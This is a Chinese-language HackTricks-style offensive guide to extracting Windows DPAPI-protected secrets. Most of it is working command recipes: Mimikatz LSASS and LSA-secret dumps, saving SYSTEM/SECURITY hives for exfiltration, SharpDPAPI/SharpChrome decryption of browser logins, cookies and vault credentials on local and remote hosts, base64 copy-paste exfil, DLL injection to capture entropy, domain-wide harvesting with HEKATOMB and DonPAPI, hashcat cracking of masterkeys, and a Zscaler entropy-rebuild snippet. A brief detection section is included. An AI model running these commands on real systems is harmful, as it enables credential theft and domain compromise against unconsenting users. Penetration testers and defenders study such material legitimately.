# DPAPI - 提取密码

{{#include ../../banners/hacktricks-training.md}}



## 什么是 DPAPI

Data Protection API (DPAPI) 主要用于 Windows 操作系统中对**非对称私钥进行对称加密**，并将用户或系统机密作为重要的熵来源。此方法通过允许开发者使用由用户登录机密派生的密钥来加密数据，或在系统加密场景下使用由系统域身份验证机密派生的密钥来加密数据，从而简化了开发者的加密工作，并免去了由开发者自行管理加密密钥保护的需求。

使用 DPAPI 最常见的方式是通过 **`CryptProtectData` 和 `CryptUnprotectData`** 函数，这些函数允许应用程序使用当前已登录进程的安全上下文来加密和解密数据。默认情况下，只有加密数据的相同用户或系统上下文才能将其解密。<sup>[[2]](#references)[[3]](#references)</sup>

这些函数还接受一个可选的**熵参数**，该参数会在加密和解密过程中使用。使用可选熵保护的数据必须使用相同的熵值才能解密。<sup>[[2]](#references)[[6]](#references)</sup>

### 用户密钥生成

DPAPI 会从用户凭据派生出一个特定于用户的值（通常称为 **pre-key**）。具体派生方式取决于账户和操作系统版本。例如，Impacket 会尝试一种基于 UTF-16LE 密码 SHA-1 摘要的 HMAC-SHA1 路径、另一种基于密码 MD4/NT hash 的路径，以及一种面向 Protected Users 的 PBKDF2-SHA256 派生路径。因此，offline tooling 通常可以从明文密码或可用的 NT hash 中派生出所需的材料。<sup>[[2]](#references)[[10]](#references)</sup>

这点尤其重要，因为如果攻击者能够获取用户的密码 hash，就可以：

- 使用该用户的密钥**解密任何使用 DPAPI 加密的数据**，而无需联系任何 API
- 通过尝试生成有效的 DPAPI 密钥来 offline **破解密码**

DPAPI 会为每个用户维护一个或多个 **master keys**，而不是为每个受保护的 blob 创建新的 master key。每个 master key 都有一个 **GUID**（Globally Unique Identifier），加密 blob 会记录保护它的 master key。<sup>[[2]](#references)</sup>

Master keys 存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是用户的 Security Identifier。master-key 文件包含由用户的 **pre-key** 保护的材料；对于域用户，还包含由**域 backup key**保护的恢复材料。<sup>[[2]](#references)</sup>

需要注意的是，用于加密 master key 的**域密钥位于域控制器中且永不变化**。因此，如果攻击者能够访问域控制器，就可以获取域 backup key，并解密该域中所有用户的 master keys。<sup>[[2]](#references)</sup>

加密 blob 的标头中包含用于加密其中数据的 **master key 的 GUID**。

> [!TIP]
> DPAPI 加密 blob 以 **`01 00 00 00`** 开头

查找 master keys：
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
这是某个用户的一组 Master Keys 的样子：

![什么是 DPAPI - 用户密钥生成：这是某个用户的一组 Master Keys 的样子](<../../images/image (1121).png>)

### Machine/System key generation

此密钥用于让 machine 加密数据。它基于 **DPAPI_SYSTEM LSA secret**，这是只有 SYSTEM 用户才能访问的特殊密钥。该密钥用于加密需要由系统本身访问的数据，例如 machine-level credentials 或 system-wide secrets。<sup>[[2]](#references)</sup>

请注意，这些密钥**没有 domain backup**，因此只能在本地访问：

- **Mimikatz** 可以使用以下命令，通过转储 LSA secrets 来访问它：`mimikatz lsadump::secrets`
- 该 secret 存储在 registry 中，因此 administrator 可以**修改 DACL permissions 来访问它**。registry 路径为：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- 也可以从 registry hives 离线提取。例如，在目标上以 administrator 身份保存 hives，然后将其 exfiltrate：
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
然后在你的分析机上，从注册表 hive 中恢复 DPAPI_SYSTEM LSA secret，并使用它解密 machine-scope blobs（scheduled task passwords、service credentials、Wi-Fi profiles 等）：
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### 由 DPAPI 保护的数据

DPAPI 保护的个人数据包括：

- Windows 凭据
- Internet Explorer 和 Google Chrome 的密码及自动完成数据
- Outlook 和 Windows Mail 等应用程序的电子邮件及内部 FTP 账户密码
- 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
- 远程桌面连接、.NET Passport 的密码，以及用于各种加密和身份验证用途的私钥
- 由 Credential Manager 管理的网络密码，以及使用 CryptProtectData 的应用程序中的个人数据，例如 Skype、MSN messenger 等
- 注册表中的加密 blobs
- ...

系统保护的数据包括：
- Wifi 密码
- Scheduled task 密码
- ...

### Master key 提取选项

- 如果用户拥有 domain admin 权限，则可以访问 **domain backup key**，以解密该域中的所有用户 Master key：
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 拥有本地管理员权限后，可以**访问 LSASS 内存**，提取所有已连接用户的 DPAPI 主密钥以及 SYSTEM 密钥。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 如果用户拥有本地 admin 权限，则可以访问 **DPAPI_SYSTEM LSA secret**，以解密机器主密钥：
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 如果已知用户的密码或 NTLM hash，则可以**直接解密该用户的 master keys**：
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 如果你在以该用户身份运行的 session 中，可以请求 DC 通过 **RPC 获取用于解密 master keys 的 backup key**。如果你是 local admin 且该用户已登录，则可以为此**窃取其 session token**：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## 列出 Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## 访问 DPAPI 加密数据

### 查找 DPAPI 加密数据

常见的用户**受保护文件**位于：

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 也请尝试将上述路径中的 `\Roaming\` 替换为 `\Local\`。

枚举示例：
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) 可以在文件系统、注册表和 B64 blobs 中查找 DPAPI 加密 blobs：<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
注意，[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（来自同一 repo）可用于使用 DPAPI 解密 cookies 等敏感数据。<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron quick recipes (SharpChrome)

- 当前用户，以交互方式解密已保存的登录信息/cookies（即使使用 Chrome 127+ app-bound cookies 也有效，因为在 user context 中运行时，会从用户的 Credential Manager 中解析额外密钥）：
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- 仅有文件时进行离线分析。首先从 profile 的 "Local State" 中提取 AES state key，然后使用它解密 cookie DB：
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- 拥有 DPAPI domain backup key（PVK）和目标主机 admin 权限时进行域范围/远程 triage：
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- 如果你拥有用户的 DPAPI prekey/credkey（来自 LSASS），就可以跳过密码破解，直接解密用户配置文件数据：
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
笔记
- 较新的 Chrome/Edge builds 可能会使用 "App-Bound" encryption 存储某些 cookies。没有额外的 app-bound key，无法对这些特定 cookies 进行离线解密；请在目标用户上下文中运行 SharpChrome，以自动获取该 key。请参阅下方引用的 Chrome security blog post。<sup>[[5]](#references)</sup>

### Access keys and data

- **Use SharpDPAPI** 从当前会话中的 DPAPI encrypted files 获取 credentials：
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **获取凭据相关信息**，例如加密数据和 guidMasterKey。<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **获取 masterkeys**：

使用 RPC 解密请求 **domain backup key** 的用户 masterkey：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** 工具还支持以下用于 masterkey 解密的参数（注意，可以使用 `/rpc` 获取域备份密钥，使用 `/password` 使用明文密码，或使用 `/pvk` 指定 DPAPI 域私钥文件……）：<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **使用 masterkey 解密数据**：
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** 工具还支持以下用于 `credentials|vaults|rdg|keepass|triage|blob|ps` 解密的参数（请注意，可以使用 `/rpc` 获取域备份密钥、使用 `/password` 使用明文密码、使用 `/pvk` 指定 DPAPI 域私钥文件，以及使用 `/unprotect` 使用当前用户会话……）：<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- 直接使用 DPAPI prekey/credkey（不需要密码）

如果你可以 dump LSASS，Mimikatz 通常会暴露一个与登录会话对应的 DPAPI key，无需知道明文密码即可使用它解密用户的 masterkeys。将此值直接传递给 tooling：
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- 使用**当前用户会话**解密一些数据：
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### 使用 Impacket dpapi.py 进行离线解密

如果你拥有受害用户的 SID 和密码（或 NT hash），就可以完全离线地解密 DPAPI masterkeys 和 Credential Manager blobs，使用 Impacket 的 dpapi.py。<sup>[[10]](#references)[[11]](#references)</sup>

- 识别磁盘上的 artefacts：
- Credential Manager blob(s)：%APPDATA%\Microsoft\Credentials\<hex>
- 匹配的 masterkey：%APPDATA%\Microsoft\Protect\<SID>\{GUID}

- 如果文件传输工具不稳定，可以在主机上对文件执行 base64 编码，然后复制输出：
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- 使用用户的 SID 和密码/hash 解密 masterkey：
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 使用解密后的 masterkey 解密 credential blob：
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
此工作流通常可以恢复由使用 Windows Credential Manager 的应用保存的域凭据，其中包括管理账户（例如 `*_adm`）。

---

### 处理可选 Entropy（“Third-party entropy”）

某些应用会向 `CryptProtectData` 传递额外的 **entropy** 值。没有此值，即使已知正确的 masterkey，也无法解密该 blob。因此，在针对以这种方式保护的凭据时，获取 entropy 至关重要（例如 Microsoft Outlook 和某些 VPN clients）。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）是一个 user-mode DLL，它会 hook 目标进程中的 DPAPI functions，并透明地记录所提供的任何 optional entropy。以 **DLL-injection** 模式对 `outlook.exe` 或 `vpnclient.exe` 等进程运行 EntropyCapture 后，会输出一个文件，将每个 entropy buffer 映射到调用进程和 blob。之后可以将捕获的 entropy 提供给 **SharpDPAPI**（`/entropy:`）或 **Mimikatz**（`/entropy:<file>`），以解密数据。<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### 离线破解 masterkeys（Hashcat 和 DPAPISnoop）

Microsoft 从 Windows 10 v1607（2016 年）开始引入 **context 3** masterkey 格式。`hashcat` v6.2.6（2023 年 12 月）新增了 hash-modes **22100**（DPAPI masterkey v1 context ）、**22101**（context 1）和 **22102**（context 3），支持直接从 masterkey 文件中对用户密码进行 GPU 加速破解。因此，攻击者无需与目标系统交互，即可执行 word-list 或 brute-force 攻击。<sup>[[7]](#references)</sup>

`DPAPISnoop`（2024 年）可自动完成此过程：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
该工具还可以解析 Credential 和 Vault blobs，使用破解的密钥解密它们，并导出明文密码。<sup>[[8]](#references)</sup>


### 访问其他机器的数据

在 **SharpDPAPI 和 SharpChrome** 中，你可以指定 **`/server:HOST`** 选项来访问远程机器的数据。当然，你需要能够访问该机器，并且以下示例假定已知 **domain backup encryption key**：
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 其他工具

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一个可自动从 LDAP directory 中提取所有 users 和 computers，并通过 RPC 提取 domain controller backup key 的工具。随后，该脚本会解析所有 computers 的 IP address，并对所有 computers 执行 smbclient，以获取所有 users 的 DPAPI blobs，然后使用 domain backup key 解密所有内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

通过从 LDAP 提取的 computers 列表，即使事先不知道，也可以找到每个子 network！

### DonPAPI 2.x（2024-05）

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动 dump 受 DPAPI 保护的 secrets。2.x 版本新增了：<sup>[[9]](#references)</sup>

* 从数百台 hosts 并行收集 blobs
* 解析 **context 3** masterkeys，并自动集成 Hashcat cracking
* 支持 Chrome “App-Bound” encrypted cookies（见下一节）
* 新增 **`--snapshot`** 模式，可反复轮询 endpoints，并 diff 新创建的 blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 是一个用于解析 masterkey/credential/vault files 的 C# parser，可以输出 Hashcat/JtR formats，并可选择自动调用 cracking。它完全支持 Windows 11 24H1 及更早版本中的 machine 和 user masterkey formats。<sup>[[8]](#references)</sup>


## 常见检测项

- 访问 `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 以及其他与 DPAPI 相关的 directories。
- 尤其是通过 **C$** 或 **ADMIN$** 等 network share 进行访问。
- 使用 **Mimikatz**、**SharpDPAPI** 或类似 tooling 访问 LSASS memory 或 dump masterkeys。
- Event **4662**：*An operation was performed on an object* —— 可与访问 **`BCKUPKEY`** object 关联分析。
- 当某个 process 请求 *SeTrustedCredManAccessPrivilege*（Credential Manager）时产生的 Event **4673/4674**。

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。拥有 network access 的 attacker 可以诱骗 domain member 获取恶意 DPAPI backup key，从而解密 user masterkeys。该漏洞已在 2023 年 11 月的 cumulative update 中修复——administrators 应确保 DCs 和 workstations 均已完成完整 patch。<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption**（2024 年 7 月）使用额外存储在 user **Credential Manager** 下的 key，取代了旧版仅依赖 DPAPI 的 protection。现在，离线解密 cookies 需要 DPAPI masterkey 和 **GCM-wrapped app-bound key**。SharpChrome v2.3 和 DonPAPI 2.x 在 user context 下运行时能够恢复额外的 key。<sup>[[5]](#references)</sup>


### 案例研究：Zscaler Client Connector – 从 SID 派生的 Custom Entropy

Zscaler Client Connector 将多个 configuration files 存储在 `C:\ProgramData\Zscaler` 下（例如 `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）。每个 file 都使用 **DPAPI (Machine scope)** 加密，但 vendor 提供的 **custom entropy** 是在 *runtime* 计算得出的，而不是存储在 disk 上。<sup>[[1]](#references)</sup>

该 entropy 由两个 elements 重新构建：

1. 嵌入 `ZSACredentialProvider.dll` 内部的 hard-coded secret。
2. 配置所属 Windows account 的 **SID**。

该 DLL 实现的 algorithm 等价于：
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
由于该 secret 嵌入在可从磁盘读取的 DLL 中，**任何拥有 SYSTEM 权限的本地攻击者都可以为任意 SID 重新生成 entropy，并离线解密这些 blobs：**
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
解密后会得到完整的 JSON 配置，其中包括每个 **device posture check** 及其预期值——这些信息对于尝试 client-side bypasses 非常有价值。

> TIP: 其他加密 artefacts（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）使用 DPAPI 保护，且不包含 entropy（`16` 个零字节）。因此，在获得 SYSTEM 权限后，可以直接使用 `ProtectedData.Unprotect` 对其进行解密。

## References

- [1] [Synacktiv – 你应该信任你的 zero trust 吗？绕过 Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets。DPAPI 中的安全分析与数据恢复](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [使用 Mimikatz 和 C++ 读取 DPAPI 加密的 Secrets](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI（Data Protection Application Programming Interface）Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [改进 Chrome cookies 在 Windows 上的安全性](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture：简单提取 DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy：AD ACL abuse、KeePassXC Argon2 cracking 以及 DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
